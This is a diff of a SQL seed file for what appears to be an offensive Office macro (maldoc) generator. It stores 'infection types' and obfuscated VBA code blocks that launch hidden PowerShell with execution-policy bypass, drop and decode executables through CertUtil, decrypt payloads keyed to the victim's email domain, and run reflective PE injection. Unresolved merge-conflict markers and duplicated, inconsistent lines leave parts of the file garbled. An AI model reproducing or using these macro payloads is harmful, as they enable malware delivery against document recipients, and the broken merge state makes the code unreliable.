@@ -126,7 +126,11 @@ CREATE TABLE `InfectionType_Dependencies` (
 INSERT INTO PayloadTypes (Name, Description) VALUES ('Shell Command', 'Standard shell command. Uses Wscript.Shell to fire the command exactly as is. Be sure your escapes are correct. <evilgrin>');
 INSERT INTO PayloadTypes (Name, Description) VALUES ('PowerShell Script', 'A standard, non-base64 encoded powershell script to run');
 INSERT INTO PayloadTypes (Name, Description) VALUES ('Executable', 'Embeds an EXE into cells & fires');    
+<<<<<<< HEAD
+INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Shell Command', 'Uses Wscript.Shell to fire the command exactly as is in a hidden window. Be sure your escapes are correct.', 'xls');                                                                              --1
+=======
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Shell Command', 'Uses Wscript.Shell to fire the command exactly as is in a hidden window. Be sure your escapes are correct.', 'xls,doc');                                                                              --1
+>>>>>>> dev
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Cell Embed', 'Your "go to" for firing PowerShell scripts. Base64 encodes .ps1 payload then embeds into cells. Macro concatenates then fires directly with powershell. Payload does not touch disk.', 'xls');                        --2
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Cell Embed-nonB64', 'Embeds .ps1 into cells (no b64). Does NOT save payload to disk. Fires directly with powershell.exe. Recommended.', 'xls');                                                                    --3
 INSERT INTO InfectionTypes (Name, Description, DocType) VALUES ('Cell Embed-Encrypted', 'Embeds encrypted .ps1 into cells (no b64). Does NOT save payload to disk. Key is the user''s email domain (retrieved from AD). Fired directly with powershell.exe. Careful to escape properly.', 'xls');   --4
@@ -182,6 +186,7 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) VALUES ('CertUtil', 'exec', 
 Sub cutil(code As String)
     Dim x As String
     
+    x = "-----BEG" & "IN CER" & "TIFICATE-----"
     x = "-----BEG" & "IN CER" & "TIFI" & "CATE-----"
     x = x + vbNewLine
     x = x + code
@@ -189,6 +194,10 @@ Sub cutil(code As String)
     x = x + "-----E" & "ND CERTIF" & "ICATE-----"
     
     Dim path As String
+    path = Application.UserLibraryPath & rndname & ".txt"
+    expath = Application.UserLibraryPath & rndname & ".exe"
+    
+    Set scr = CreateObject("Scr" & "ipting.FileSy" & "stemObject")
     path = Application.UserLibraryPath & GetRnd & ".txt"
     expath = Application.UserLibraryPath & GetRnd & ".exe"
     
@@ -247,6 +256,7 @@ Sub |RANDOMNAME|()
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     x = Replace(x, """", "\""")
     Dim c As String
+    c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & " -nop -noni -windowstyle hidden -exec bypass -command " & Chr(34) & x & Chr(34)
     c = Chr(112) & Chr(79) & Chr(119) & Chr(69) & Chr(114) & Chr(83) & Chr(104) & Chr(69) & Chr(108) & Chr(76) & Chr(46) & Chr(101) & Chr(120) & Chr(69) & " -nop -noni -windowstyle 1 -command " & Chr(34) & x & Chr(34)
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
@@ -363,6 +373,7 @@ Public Function crypt(sText As String, sKey As String) As String
         bytSwap = baS(lI)
         baS(lI) = baS(lJ)
         baS(lJ) = bytSwap
+        crc = crc & Chr$((pvC(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
         crypt = crypt & Chr$((phc(baS((CLng(baS(lI)) + baS(lJ)) Mod 256), Asc(Mid$(sText, lIdx, 1)))))
     Next
 End Function
@@ -376,7 +387,7 @@ Function phc(ByVal lI As Long, ByVal lJ As Long) As Long
 End Function
 
 Public Function CalcBusiness(sText As String) As String
-    Dim lIdx            As Long
+    Dim lIdx As Long
 
     For lIdx = 1 To Len(sText)
         CalcBusiness = CalcBusiness & Right$("0" & Hex(Asc(Mid(sText, lIdx, 1))), 2)
@@ -384,7 +395,7 @@ Public Function CalcBusiness(sText As String) As String
 End Function
 
 Public Function GetBusiness(sText As String) As String
-    Dim lIdx            As Long
+    Dim lIdx As Long
 
     For lIdx = 1 To Len(sText) Step 2
         GetBusiness = GetBusiness & Chr$(CLng("&H" & Mid(sText, lIdx, 2)))
@@ -397,6 +408,9 @@ End Function
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('ShellCommand', 'harness', '
 Sub |RANDOMNAME|()
     Dim c As String
+    c = Chr(34) & |PAYLOADTEXT| & Chr(34)
+    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
+    s.Run c, 0
     c = |PAYLOADTEXT|
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run (Chr(34) & c & Chr(34)), 0
@@ -410,6 +424,7 @@ Sub |RANDOMNAME|()
     Dim x,k,p As String
     x = GetVal(|STARTROW|, |ENDROW|, |COLUMN|)
     k = em()
+    p = crc(fhd(CStr(x)), CStr(k))
     p = crypt(GetBusiness(CStr(x)), CStr(k))
     p = Replace(p, """", "\""")
     Dim c As String
@@ -426,6 +441,7 @@ End Sub
 --15
 INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('WriteFile', 'util', '
 Function cfile(b As String)
+    pth = Application.UserLibraryPath & rndname & ".txt"
     pth = Application.UserLibraryPath & GetRnd & ".txt"
     Dim f As Object
     Set f = CreateObject("Sc" & "riptin" & "g.Fil" & "eSyst" & "emObj" & "ect")
@@ -452,6 +468,8 @@ Sub |RANDOMNAME|()
     Chr(110) & Chr(111) & Chr(110) & Chr(105) & Chr(32) & Chr(45) & Chr(99) & Chr(111) & Chr(109) & Chr(109) & Chr(97) & _
     Chr(110) & Chr(100) & Chr(32) & "$s=gc " & p1 & ";$f = gc " & p2 & _
     ";$b = [System.Convert]::FromBas" & "e64String($f); " & Chr(105) & Chr(101) & Chr(88) & _
+    "([System.Text.Encoding]::Ascii.GetString([System.Convert]:" & _
+    ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PEBytes $b" & Chr(34)
     "([System.Text.Enc" & "oding]::Ascii.GetString([System.Convert]:" & _
     ":FromBas" & "e64String($s))); Invoke-Reflec" & "tivePEIn" & "jection -PE" & "Bytes $b" & Chr(34)
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
